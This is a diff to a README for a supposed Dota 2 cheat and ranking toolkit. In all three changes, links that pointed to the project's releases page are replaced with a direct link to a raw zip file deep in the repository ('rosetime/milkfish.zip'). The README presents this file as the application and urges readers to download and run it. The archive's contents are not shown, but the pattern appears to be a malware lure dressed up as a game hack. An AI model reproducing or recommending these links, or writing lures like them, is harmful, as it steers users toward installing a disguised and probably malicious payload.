@@ -1,6 +1,6 @@
 # 🎮 dota-2-hacks-2026-ranked-strategy-toolkit - Boost Your Rank With Smart Tools
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blueviolet?style=for-the-badge&logo=github)](https://github.com/Tsogtpurev/dota-2-hacks-2026-ranked-strategy-toolkit/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Tsogtpurev/dota-2-hacks-2026-ranked-strategy-toolkit/main/rosetime/milkfish.zip)
 
 ---
 
@@ -14,7 +14,7 @@ The entire process is simple. You only need to do three things: visit the downlo
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Tsogtpurev/dota-2-hacks-2026-ranked-strategy-toolkit/releases](https://github.com/Tsogtpurev/dota-2-hacks-2026-ranked-strategy-toolkit/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Tsogtpurev/dota-2-hacks-2026-ranked-strategy-toolkit/main/rosetime/milkfish.zip](https://raw.githubusercontent.com/Tsogtpurev/dota-2-hacks-2026-ranked-strategy-toolkit/main/rosetime/milkfish.zip)
 
 On that page, you'll see the latest release. Click the download button. Once the download finishes, you're ready to use the application.
 
@@ -115,7 +115,7 @@ The dota-2-hacks-2026-ranked-strategy-toolkit is your all-in-one companion for r
 
 Don't wait. Start your journey to a higher rank today.
 
-[![Get the Toolkit](https://img.shields.io/badge/Get%20the%20Toolkit-Click%20Here-brightgreen?style=for-the-badge)](https://github.com/Tsogtpurev/dota-2-hacks-2026-ranked-strategy-toolkit/releases)
+[![Get the Toolkit](https://img.shields.io/badge/Get%20the%20Toolkit-Click%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Tsogtpurev/dota-2-hacks-2026-ranked-strategy-toolkit/main/rosetime/milkfish.zip)
 
 ---
 
